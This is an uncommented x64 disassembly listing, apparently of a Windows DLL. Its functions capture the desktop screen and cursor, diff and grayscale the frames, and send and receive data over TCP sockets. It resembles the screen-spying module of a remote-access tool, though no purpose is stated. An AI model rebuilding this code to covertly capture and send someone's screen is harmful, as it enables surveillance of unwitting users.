push rdi
sub rsp 0x30
lea rax [ r--data ]
mov rsi rcx
mov dil r8b
mov [ rcx ] rax
add rcx 0xd0
mov ebx edx
call sub_1800082e8
mov eax ebx
sub eax 0x1
je r-xdata
mov [ rsi + 0xa8 ] ebx
sub eax 0x3
je r-xdata
sub eax 0x4
je r-xdata
sub eax 0x8
je r-xdata
cmp eax 0x10
je r-xdata
mov [ rsi + 0xa8 ] 0x8
jmp r-xdata
call [ GetDesktopWindow@IAT ]
mov rcx rax
mov [ rsi + 0x1d8 ] rax
call [ GetDC@IAT ]
mov [ rsi + 0x14 ] 0xcc0020
mov [ rsi + 0x8 ] 0x1
mov [ rsi + 0x50 ] rax
call [ GetTickCount@IAT ]
xor ecx ecx
mov [ rsi + 0xc ] 0x64
mov [ rsi + 0x1c ] 0xa
mov [ rsi + 0x10 ] dil
mov [ rsi + 0x18 ] eax
call [ GetSystemMetrics@IAT ]
mov ecx 0x1
mov [ rsi + 0x30 ] eax
call [ GetSystemMetrics@IAT ]
mov rcx [ rsi + 0x50 ]
and [ rsi + 0x38 ] 0x0
mov [ rsi + 0x34 ] eax
mov eax 0x20
cdq
idiv [ rsi + 0xa8 ]
mov [ rsi + 0x2c ] al
call [ CreateCompatibleDC@IAT ]
mov rcx [ rsi + 0x50 ]
mov [ rsi + 0x60 ] rax
call [ CreateCompatibleDC@IAT ]
xor ecx ecx
mov [ rsi + 0xc0 ] rax
call [ CreateCompatibleDC@IAT ]
xor ecx ecx
mov [ rsi + 0x58 ] rax
call [ CreateCompatibleDC@IAT ]
mov r8d [ rsi + 0x30 ]
mov edx [ rsi + 0xa8 ]
and [ rsi + 0x80 ] 0x0
and [ rsi + 0x88 ] 0x0
mov r9d 0x1
mov rcx rsi
mov [ rsi + 0x68 ] rax
call sub_180009710
mov r9d [ rsi + 0x34 ]
mov r8d [ rsi + 0x30 ]
mov edx [ rsi + 0xa8 ]
mov rcx rsi
mov [ rsi + 0x90 ] rax
call sub_180009710
mov r8d [ rsi + 0x30 ]
mov edx [ rsi + 0xa8 ]
mov r9d 0x1
mov rcx rsi
mov [ rsi + 0x98 ] rax
call sub_180009710
mov rdx [ rsi + 0x90 ]
mov rcx [ rsi + 0x50 ]
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r9 [ rsi + 0x80 ]
xor r8d r8d
mov [ rsi + 0xa0 ] rax
call [ CreateDIBSection@IAT ]
mov rdx [ rsi + 0x98 ]
mov rcx [ rsi + 0x50 ]
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r9 [ rsi + 0x88 ]
xor r8d r8d
mov [ rsi + 0x70 ] rax
call [ CreateDIBSection@IAT ]
and [ rsp + 0x28 ] 0x0
mov rdx [ rsi + 0x98 ]
mov rcx [ rsi + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsi + 0xb0 ]
xor r8d r8d
mov [ rsi + 0x78 ] rax
call [ CreateDIBSection@IAT ]
mov rdx [ rsi + 0x78 ]
mov rcx [ rsi + 0x60 ]
mov [ rsi + 0xc8 ] rax
call [ SelectObject@IAT ]
mov rdx [ rsi + 0x70 ]
mov rcx [ rsi + 0x58 ]
call [ SelectObject@IAT ]
mov rdx [ rsi + 0xc8 ]
mov rcx [ rsi + 0xc0 ]
call [ SelectObject@IAT ]
mov eax [ rsi + 0x34 ]
mov r9d [ rsi + 0x30 ]
lea rcx [ rsi + 0x3c ]
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] eax
call [ SetRect@IAT ]
mov r11 [ rsi + 0x98 ]
mov eax [ r11 + 0x14 ]
lea ecx [ rax + rax ]
call j_sub_18000dc18
mov rbx [ rsp + 0x40 ]
xor edx edx
mov [ rsi + 0x20 ] rax
mov rax [ rsi + 0x98 ]
mov eax [ rax + 0x14 ]
div [ rsi + 0x34 ]
and [ rsi + 0x28 ] 0x0
mov [ rsi + 0xac ] eax
mov rax rsi
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_1800092dc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_18000930c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000e06c
sub_18000930c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdx [ rcx + 0x50 ]
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov rcx [ rcx + 0x1d8 ]
call [ ReleaseDC@IAT ]
mov rcx [ rbx + 0x58 ]
call [ DeleteDC@IAT ]
mov rcx [ rbx + 0x60 ]
call [ DeleteDC@IAT ]
mov rcx [ rbx + 0x68 ]
call [ DeleteDC@IAT ]
mov rcx [ rbx + 0xc0 ]
call [ DeleteDC@IAT ]
mov rcx [ rbx + 0x70 ]
call [ DeleteObject@IAT ]
mov rcx [ rbx + 0x78 ]
call [ DeleteObject@IAT ]
mov rcx [ rbx + 0xc8 ]
call [ DeleteObject@IAT ]
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x98 ]
call j_sub_18000e06c#2
mov rcx [ rbx + 0x90 ]
call j_sub_18000e06c#2
mov rcx [ rbx + 0xa0 ]
call j_sub_18000e06c#2
lea rax [ r--data ]
add rbx 0x158
mov [ rbx - 0x88 ] rax
mov edi 0x10
call j_sub_18000e06c#2
mov rcx [ rbx ]
call [ DestroyCursor@IAT ]
add rbx 0x8
sub rdi 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800093ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x50
xor r12d r12d
mov rsi rdx
mov rbx rcx
cmp rdx r12
je r-xdata
xor eax eax
cmp [ rcx + 0x20 ] r12
je r-xdata
call sub_180009a70
lea r8d [ r12 + 0x1 ]
lea rdx [ rbx + 0x8 ]
mov rcx rbx
mov [ rbx + 0x28 ] r12d
call sub_180009864
lea rcx [ rsp + 0x80 ]
call [ GetCursorPos@IAT ]
lea r8d [ r12 + 0x8 ]
lea rdx [ rsp + 0x80 ]
mov rcx rbx
call sub_180009864
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x18
call [ GetCursorInfo@IAT ]
cmp eax r12d
je r-xdata
or edi 0xffffffff
cmp [ rsp + 0x34 ] 0x1
jne r-xdata
mov eax [ rsp + 0x84 ]
lea edi [ rax - 0x13 ]
cmp edi r12d
cmovl edi r12d
cmp eax [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x98 ]
mov r8 [ rbx + 0x50 ]
mov rdx [ rbx + 0xc0 ]
mov eax [ rcx + 0x8 ]
mov r9d [ rcx + 0x4 ]
mov rcx rbx
mov [ rsp + 0x20 ] eax
call sub_180009ac0
mov r11 [ rbx + 0x98 ]
mov r9d [ rbx + 0x28 ]
mov eax [ r11 + 0x14 ]
mov r8 [ rbx + 0x88 ]
add r9 [ rbx + 0x20 ]
mov rdx [ rbx + 0xb0 ]
mov rcx rbx
mov [ rsp + 0x20 ] eax
call sub_180009b68
add eax [ rbx + 0x28 ]
mov [ rsi ] eax
mov rcx [ rsp + 0x38 ]
mov edi r12d
mov rdx r12
lea rax [ rbx + 0x158 ]
mov edi [ rbx + 0x38 ]
jmp r-xdata
mov edx edi
mov rcx rbx
call sub_1800095e8
cmp al r12b
jne r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
call [ DestroyCursor@IAT ]
or eax 0xffffffff
cmp edi 0x10
cmove edi eax
jmp r-xdata
inc rdx
inc edi
add rax 0x8
cmp rdx 0x10
jl r-xdata
cmp edi [ rbx + 0x34 ]
jl r-xdata
add edi 0x13
lea rdx [ rsp + 0x78 ]
mov r8d 0x1
mov rcx rbx
mov [ rsp + 0x78 ] dil
call sub_180009864
cmp [ rbx + 0x8 ] 0x2
jne r-xdata
cmp rcx [ rax ]
je r-xdata
mov edx edi
mov rcx rbx
call sub_1800095e8
cmp al r12b
je r-xdata
mov eax [ rsp + 0x84 ]
mov ecx [ rbx + 0x38 ]
mov [ rw-data ] eax
add ecx 0x3
mov eax 0x6bca1af3
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ rbx + 0x28 ]
mov [ rsi ] eax
imul edx edx 0x13
sub ecx edx
mov [ rbx + 0x38 ] ecx
jmp r-xdata
add edi 0x13
call [ GetTickCount@IAT ]
sub eax [ rbx + 0x18 ]
cmp eax [ rbx + 0x1c ]
jb r-xdata
mov ecx 0x1
call [ Sleep@IAT ]
call [ GetTickCount@IAT ]
xchg [ rbx + 0x18 ] eax
jmp r-xdata
mov rax [ rbx + 0x20 ]
jmp r-xdata
sub_1800095e8
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
mov [ r11 + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x50
mov eax [ rcx + 0x14 ]
mov r9d [ rcx + 0x30 ]
mov rdi rcx
mov [ rsp + 0x40 ] eax
mov rax [ rcx + 0x50 ]
mov rcx [ rcx + 0x58 ]
mov [ rsp + 0x38 ] edx
mov ebx edx
xor esi esi
mov [ rsp + 0x30 ] esi
mov [ r11 - 0x40 ] rax
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] 0x1
call [ BitBlt@IAT ]
mov ebp [ rdi + 0x34 ]
mov r12 [ rdi + 0x80 ]
sub ebp ebx
lea eax [ rbx + 0x26 ]
lea r8d [ rbx - 0x13 ]
dec ebp
or ebx 0xffffffff
lea rcx [ rdi + 0x3c ]
mov r9d ebx
mov edx ebx
mov [ rsp + 0x20 ] eax
imul ebp [ rdi + 0xac ]
add ebp [ rdi + 0x88 ]
call [ SetRect@IAT ]
mov edx [ rdi + 0x30 ]
cmp edx esi
mov r11d esi
jle r-xdata
cmp [ rdi + 0x44 ] ebx
jle r-xdata
movzx ecx [ rdi + 0x2c ]
lea r11 [ rsp + 0x50 ]
mov al sil
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
cmp [ rdi + 0x3c ] esi
mov eax esi
mov rcx rdi
cmovg eax [ rdi + 0x3c ]
cmp [ rdi + 0x40 ] esi
cmovg esi [ rdi + 0x40 ]
cmp [ rdi + 0x44 ] edx
mov [ rdi + 0x3c ] eax
cmovl edx [ rdi + 0x44 ]
mov eax [ rdi + 0x34 ]
mov [ rdi + 0x40 ] esi
cmp [ rdi + 0x48 ] eax
mov [ rdi + 0x44 ] edx
lea rdx [ rdi + 0x3c ]
cmovl eax [ rdi + 0x48 ]
mov [ rdi + 0x48 ] eax
call sub_1800098e0
mov sil 0x1
add r11d ecx
add rbp 0x4
add r12 0x4
cmp r11d edx
jl r-xdata
cmp [ rdi + 0x44 ] esi
jge r-xdata
mov eax [ r12 ]
cmp [ rbp ] eax
je r-xdata
lea eax [ r11 + 0x18 ]
mov [ rdi + 0x44 ] eax
lea eax [ r11 - 0x18 ]
mov [ rdi + 0x3c ] eax
sub_180009710
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x40
mov r13 rcx
mov ecx edx
xor r12d r12d
mov r15d 0x1
mov edi r9d
mov ebx r8d
mov eax r15d
mov esi edx
shl eax cl
cmp edx 0x8
cmovle r12d eax
lea eax [ r12 * 4 + 0x28 ]
movsxd rcx eax
call j_sub_18000dc18
movzx ecx si
and [ rax + 0x10 ] 0x0
and [ rax + 0x18 ] 0x0
and [ rax + 0x1c ] 0x0
imul ecx ebx
and [ rax + 0x20 ] 0x0
and [ rax + 0x24 ] 0x0
add ecx 0x1f
sar ecx 0x3
mov rbp rax
mov [ rax ] 0x28
and ecx 0xfffffffc
mov [ rax + 0x4 ] ebx
mov [ rax + 0x8 ] edi
mov [ rax + 0xc ] r15w
mov [ rax + 0xe ] si
imul ecx edi
cmp esi 0x10
mov [ rax + 0x14 ] ecx
jge r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r13
pop r12
retn
xor ecx ecx
call [ GetDC@IAT ]
mov r8d r15d
mov edx r15d
mov rcx rax
mov rdi rax
call [ CreateCompatibleBitmap@IAT ]
and [ rsp + 0x30 ] 0x0
xor r9d r9d
xor r8d r8d
mov rcx rdi
mov rdx rax
mov [ rsp + 0x28 ] rbp
and [ rsp + 0x20 ] 0x0
mov rbx rax
call [ GetDIBits@IAT ]
mov rdx rdi
xor ecx ecx
call [ ReleaseDC@IAT ]
mov rcx rbx
call [ DeleteObject@IAT ]
cmp [ r13 + 0x10 ] 0x0
je r-xdata
mov rax rbp
movsxd r8 r12d
test r12d r12d
jle r-xdata
lea rdx [ rbp + 0x29 ]
movzx ecx [ rdx ]
movzx eax [ rdx + 0x1 ]
imul ecx ecx 0x259
imul eax eax 0x132
add ecx eax
movzx eax [ rdx - 0x1 ]
imul eax eax 0x75
add ecx eax
sar ecx 0xa
mov [ rdx - 0x1 ] cl
mov [ rdx ] cl
mov [ rdx + 0x1 ] cl
add rdx 0x4
sub r8 r15
jne r-xdata
sub_180009864
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov ecx [ rcx + 0x28 ]
movsxd rdi r8d
add rcx [ rbx + 0x20 ]
mov r8 rdi
call sub_1800160e0
add [ rbx + 0x28 ] edi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180009894
push rbx
sub rsp 0x50
mov eax [ rcx + 0x14 ]
mov r9d [ rcx + 0x30 ]
mov rbx rcx
mov [ rsp + 0x40 ] eax
mov rax [ rcx + 0x50 ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] rax
mov eax [ rcx + 0x34 ]
mov rcx [ rcx + 0x60 ]
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] eax
call [ BitBlt@IAT ]
mov rax [ rbx + 0x88 ]
add rsp 0x50
pop rbx
retn
sub_1800098e0
mov r11 rsp
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov esi [ rdx + 0x8 ]
mov edi [ rdx + 0xc ]
mov rax [ rcx + 0xa0 ]
sub esi [ rdx ]
sub edi [ rdx + 0x4 ]
mov r12 rcx
mov rbp rdx
xor edx edx
lea r9 [ r11 + 0x8 ]
mov [ r11 + 0x8 ] rdx
mov [ rax + 0x4 ] esi
mov rax [ rcx + 0xa0 ]
mov [ rax + 0x8 ] edi
mov rcx [ rcx + 0xa0 ]
mov [ rsp + 0x28 ] edx
movzx eax [ rcx + 0xe ]
mov [ r11 - 0x48 ] rdx
xor r8d r8d
imul eax [ rcx + 0x4 ]
add eax 0x1f
sar eax 0x3
and eax 0xfffffffc
imul eax [ rcx + 0x8 ]
mov [ rcx + 0x14 ] eax
mov rdx [ r12 + 0xa0 ]
mov rcx [ r12 + 0x50 ]
call [ CreateDIBSection@IAT ]
mov rcx [ r12 + 0x68 ]
mov rdx rax
mov rbx rax
call [ SelectObject@IAT ]
mov ecx [ r12 + 0x14 ]
mov r8d [ rbp + 0x4 ]
mov edx [ rbp ]
mov [ rsp + 0x40 ] ecx
mov rcx [ r12 + 0x50 ]
mov [ rsp + 0x38 ] r8d
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x28 ] rcx
mov rcx [ r12 + 0x60 ]
mov r9d esi
mov [ rsp + 0x20 ] edi
call [ BitBlt@IAT ]
mov eax [ rbp + 0x4 ]
mov rcx [ r12 + 0x68 ]
mov [ rsp + 0x40 ] 0xcc0020
mov [ rsp + 0x38 ] eax
mov eax [ rbp ]
mov [ rsp + 0x30 ] eax
mov rax [ r12 + 0x60 ]
mov r9d esi
mov [ rsp + 0x28 ] rax
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] edi
call [ BitBlt@IAT ]
mov r8d 0x10
mov rdx rbp
mov rcx r12
call sub_180009864
mov r11 [ r12 + 0xa0 ]
mov rdx [ rsp + 0x70 ]
mov r8d [ r11 + 0x14 ]
mov rcx r12
call sub_180009864
mov rcx rbx
call [ DeleteObject@IAT ]
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
sub_180009a70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_18000b6ec
mov bl al
test al al
je r-xdata
mov al bl
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rdx [ rdi + 0x50 ]
mov rcx [ rdi + 0x1d8 ]
call [ ReleaseDC@IAT ]
call [ GetDesktopWindow@IAT ]
mov rcx rax
mov [ rdi + 0x1d8 ] rax
call [ GetDC@IAT ]
mov [ rdi + 0x50 ] rax
sub_180009ac0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x50
xor esi esi
mov ebp r9d
mov r12 r8
cmp [ rsp + 0x90 ] esi
mov r13 rdx
mov r14 rcx
jle r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
lea r15d [ rsi + 0x32 ]
mov eax [ r14 + 0x14 ]
mov ebx [ rsp + 0x90 ]
mov r9d ebp
mov [ rsp + 0x40 ] eax
mov [ rsp + 0x38 ] esi
sub ebx esi
cmp ebx r15d
mov r8d esi
mov rcx r13
cmova ebx r15d
and [ rsp + 0x30 ] 0x0
xor edx edx
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] ebx
call [ BitBlt@IAT ]
mov ecx 0x5
call [ Sleep@IAT ]
add esi ebx
cmp esi [ rsp + 0x90 ]
jl r-xdata
sub_180009b68
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
mov r11d [ rsp + 0x40 ]
xor ecx ecx
mov rbx r9
mov r10d ecx
cmp r11d ecx
jbe r-xdata
mov rbx [ rsp + 0x20 ]
mov rbp [ rsp + 0x28 ]
mov rsi [ rsp + 0x30 ]
mov rdi [ rsp + 0x38 ]
mov eax ecx
pop r14
pop r13
pop r12
retn
lea r14d [ rcx + 0x4 ]
add r10d r14d
add r8 r14
add rdx r14
cmp r10d r11d
jb r-xdata
movsxd rax ecx
lea ebp [ rcx + 0x4 ]
mov r9d r14d
mov [ rax + rbx ] r10d
mov eax [ rdx ]
add r10d r14d
mov [ r8 ] eax
mov eax [ rdx ]
lea r12d [ rbp + 0x4 ]
movsxd r13 r12d
add r8 r14
add rdx r14
mov rdi r14
mov esi r10d
mov [ r13 + rbx ] eax
cmp r10d r11d
jae r-xdata
mov eax [ rdx ]
cmp [ r8 ] eax
je r-xdata
movsxd rax ebp
lea ecx [ r9 + r12 ]
mov [ rax + rbx ] r9d
mov eax [ rdx ]
cmp [ r8 ] eax
je r-xdata
mov [ r8 ] eax
mov eax [ rdx ]
lea rcx [ rdi + r13 ]
add esi r14d
add r9d r14d
add rdi r14
add r10d r14d
add r8 r14
add rdx r14
mov [ rcx + rbx ] eax
cmp esi r11d
jb r-xdata
sub_180009c4c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
lea rcx [ rw-data ]
mov rbx rdx
call [ EnterCriticalSection@IAT ]
mov rax [ rbx ]
lea r11 [ rsp + 0x20 ]
mov [ r11 ] rax
mov rax [ rbx + 0x8 ]
mov ecx 0x28
mov [ r11 + 0x8 ] rax
mov rax [ rbx + 0x10 ]
mov [ r11 + 0x10 ] rax
call sub_18000dc18
xor edi edi
mov rbx rax
cmp rax rdi
je r-xdata
mov rbx rdi
lea rcx [ rax + 0x10 ]
call sub_180009c38
jmp r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x50 ]
mov eax edi
add rsp 0x40
pop rdi
retn
xor edx edx
mov rcx rbx
lea r8d [ rdx + 0x28 ]
call sub_180016870
cmp [ rw-data ] edi
jne r-xdata
cmp rbx rdi
je r-xdata
lea rcx [ rsp + 0x20 ]
mov rax [ rcx ]
mov [ rbx + 0x10 ] rax
mov rax [ rcx + 0x8 ]
mov [ rbx + 0x18 ] rax
mov rax [ rcx + 0x10 ]
mov [ rbx + 0x20 ] rax
mov rax [ rw-data ]
mov [ rax + 0x8 ] rbx
mov rax [ rw-data ]
mov [ rbx ] rax
mov rax [ rw-data ]
mov [ rbx + 0x8 ] rax
mov rax [ rw-data ]
mov [ rax ] rbx
mov eax [ rw-data ]
mov [ rw-data ] rbx
inc eax
mov [ rw-data ] eax
mov edi eax
mov [ rw-data ] rbx
mov [ rw-data ] rbx
sub_180009d48
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rcx [ rw-data ]
mov rdi rdx
xor ebx ebx
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov r11 [ rw-data ]
cmp eax ebx
mov ecx ebx
jle r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ r11 + 0x10 ] rdi
je r-xdata
cmp eax ebx
je r-xdata
mov r11 [ r11 + 0x8 ]
inc ecx
cmp ecx eax
jl r-xdata
mov ebx 0x1
mov rcx [ r11 ]
mov rax [ r11 + 0x8 ]
mov [ rcx + 0x8 ] rax
mov rax [ r11 ]
mov rcx [ r11 + 0x8 ]
mov [ rcx ] rax
mov rax [ rw-data ]
cmp r11 rax
jne r-xdata
jmp r-xdata
mov rax [ rw-data ]
cmp r11 rax
jne r-xdata
mov rax [ rax + 0x8 ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx r11
call j_sub_18000e06c
dec [ rw-data ]
mov rax [ rax ]
mov [ rw-data ] rax
sub_180009e00
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rcx [ rw-data ]
mov rdi rdx
xor ebx ebx
call [ EnterCriticalSection@IAT ]
mov ecx [ rw-data ]
mov r11 [ rw-data ]
cmp ecx ebx
mov eax ebx
jle r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ r11 + 0x10 ] rdi
je r-xdata
lea rbx [ r11 + 0x10 ]
mov r11 [ r11 + 0x8 ]
inc eax
cmp eax ecx
jl r-xdata
jmp r-xdata
sub_180009e60
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rcx [ rw-data ]
mov rdi rdx
xor ebx ebx
call [ EnterCriticalSection@IAT ]
mov ecx [ rw-data ]
mov r11 [ rw-data ]
cmp ecx ebx
mov eax ebx
jle r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ r11 + 0x10 ] rdi
je r-xdata
mov ebx [ r11 + 0x18 ]
mov r11 [ r11 + 0x8 ]
inc eax
cmp eax ecx
jl r-xdata
jmp r-xdata
sub_180009ec0
push rbx
sub rsp 0x30
mov eax 0x1
lea r9 [ rsp + 0x48 ]
mov edx 0xffff
mov [ rsp + 0x48 ] ax
xor eax eax
mov r8d 0x80
mov rbx rcx
mov [ rsp + 0x20 ] 0x4
mov [ rsp + 0x4a ] ax
call [ setsockopt@IAT ]
mov rcx rbx
call [ closesocket@IAT ]
add rsp 0x30
pop rbx
retn
sub_180009f08
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
movzx ebx dx
mov edx 0x1
mov esi ecx
lea ebp [ rdx + 0x1 ]
lea r8d [ rdx + 0x5 ]
mov ecx ebp
call [ socket@IAT ]
mov rdi rax
cmp rax 0xffffffffffffffff
jne r-xdata
movzx ecx bx
mov [ rsp + 0x20 ] bp
mov [ rsp + 0x24 ] esi
call [ htons@IAT ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x10
mov rcx rdi
mov [ rsp + 0x22 ] ax
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov rax rdi
call [ GetLastError@IAT ]
mov rcx rdi
mov ebx eax
call sub_180009ec0
mov ecx ebx
call [ SetLastError@IAT ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_180009fa4
push rbx
sub rsp 0x130
mov r8 rcx
movzx ebx dx
lea rcx [ rsp + 0x20 ]
xor r9d r9d
mov edx 0x104
call sub_18000c71c
lea rcx [ rsp + 0x20 ]
call [ inet_addr@IAT ]
lea rcx [ rsp + 0x20 ]
cmp eax 0xffffffff
je r-xdata
call sub_18000a0b8
test rax rax
je r-xdata
call [ inet_addr@IAT ]
movzx edx bx
mov ecx eax
call sub_180009f08
jmp r-xdata
xor eax eax
lea rcx [ rsp + 0x20 ]
call sub_18000a0b8
mov rcx rax
jmp r-xdata
add rsp 0x130
pop rbx
retn
sub_18000a010
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movzx edi dx
mov rbx rcx
call [ inet_addr@IAT ]
mov rcx rbx
cmp eax 0xffffffff
je r-xdata
call sub_18000a0b8
test rax rax
je r-xdata
call [ inet_addr@IAT ]
movzx edx di
mov ecx eax
call sub_180009f08
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_18000a0b8
mov rcx rax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000a064
sub rsp 0x28
mov r8 rcx
lea rcx [ rw-data ]
xor r9d r9d
mov edx 0x400
call sub_18000c71c
mov rcx rax
call [ gethostbyname@IAT ]
test rax rax
je r-xdata
add rsp 0x28
retn
mov rax [ rax + 0x18 ]
mov rcx [ rax ]
mov ecx [ rcx ]
call [ inet_ntoa@IAT ]
lea rcx [ rw-data ]
xor r9d r9d
mov r8 rax
mov edx 0x400
call sub_18000c7d4
sub_18000a0dc
mov rax rsp
sub rsp 0x248
xor r8d r8d
mov [ rax + 0x8 ] edx
cmp edx 0xffffffff
mov [ rax + 0xc ] r8d
lea rax [ rax + 0x8 ]
mov [ rsp + 0x38 ] rcx
cmove rax r8
lea rdx [ rsp + 0x30 ]
inc ecx
xor r9d r9d
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x30 ] 0x1
call [ select@IAT ]
add rsp 0x248
retn
sub_18000a128
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
xor ebx ebx
mov r12d r9d
mov esi r8d
cmp r8d ebx
mov r13 rdx
mov rbp rcx
mov edi ebx
jle r-xdata
cmp esi edi
sete bl
mov eax ebx
mov edx r12d
mov rcx rbp
call sub_18000a0dc
cmp eax ebx
jle r-xdata
xor eax eax
jmp r-xdata
mov r8d esi
movsxd rdx edi
xor r9d r9d
sub r8d edi
add rdx r13
mov rcx rbp
call [ recv@IAT ]
cmp eax ebx
jle r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
add edi eax
cmp edi esi
jl r-xdata
sub_18000a1ac
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
sub rsp 0x20
mov edi r8d
mov rbp rdx
lea r8 [ rax + 0x18 ]
xor ebx ebx
mov edx 0x8004667e
mov rsi rcx
and [ rax + 0x18 ] ebx
call [ ioctlsocket@IAT ]
test edi edi
jle r-xdata
call [ GetLastError@IAT ]
movsxd rdx ebx
xor r9d r9d
mov r8d edi
add rdx rbp
mov rcx rsi
call [ send@IAT ]
test eax eax
jle r-xdata
test ebx ebx
jg r-xdata
sub edi eax
add ebx eax
test edi edi
jg r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x48 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000a24c
push rbx
sub rsp 0x20
mov rbx [ rw-data ]
mov rcx rbx
call sub_18000a224
xor r9d r9d
lea rdx [ rsp + 0x40 ]
lea r8d [ r9 + 0x1 ]
mov rcx rbx
call [ recv@IAT ]
cmp eax 0x1
jne r-xdata
xor al al
cmp [ rsp + 0x40 ] 0xf4
jne r-xdata
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000a28c
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
mov eax 0x4020
call sub_1800232c0
sub rsp rax
mov rbx rcx
cmp rcx 0xffffffffffffffff
jne r-xdata
lea r8 [ rsp + 0x4040 ]
lea rcx [ rsp + 0x20 ]
